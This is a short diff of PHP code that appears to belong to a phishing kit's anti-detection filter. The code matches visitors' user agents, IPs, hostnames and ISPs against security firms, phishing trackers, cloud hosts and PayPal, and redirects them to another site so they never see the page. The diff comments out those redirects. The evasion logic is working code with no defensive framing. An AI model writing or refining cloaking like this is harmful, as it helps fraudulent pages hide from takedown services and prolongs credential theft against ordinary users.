@@ -8,17 +8,17 @@
     $shit_isps=array("DigitalOcean","Amazon","Google","phishtank","net4sec","AVAST Software s.r.o.","BullGuard ApS","PayPal","Hotmail","Yahoo","AOL","Microsoft","Kaspersky Lab","Linode, LLC","MSN","ONLINE S.A.S.","Joshua Peter McQuistan");
     foreach($bots_agents as $bot_agent){
         if(substr_count($user_agent,$bot_agent)>0){
-            exit(header('Location: http://2m.ma'));
+            // exit(header('Location: http://2m.ma'));
         }
     }   
     foreach($bots_ips as $bot_ip){
         if(preg_match('/'.$bot_ip.'/',$user_ip)){
-            exit(header('Location: http://2m.ma'));
+            // exit(header('Location: http://2m.ma'));
             }
         }
     foreach($blocked_words as $word){
         if(substr_count($hostname,$word)>0){
-            exit(header('Location: http://2m.ma'));
+            // exit(header('Location: http://2m.ma'));
         }
     }
         $ipp=isset($user_ip)&&$user_ip!=""?$user_ip:"1.1.1.1";
@@ -27,7 +27,7 @@
             return "ppp";
         }
     foreach($shit_isps as $isp){if(substr_count($ISP,$isp)){
-        exit(header('Location: http://2m.ma'));
+        // exit(header('Location: http://2m.ma'));
     }
     }
 ?>
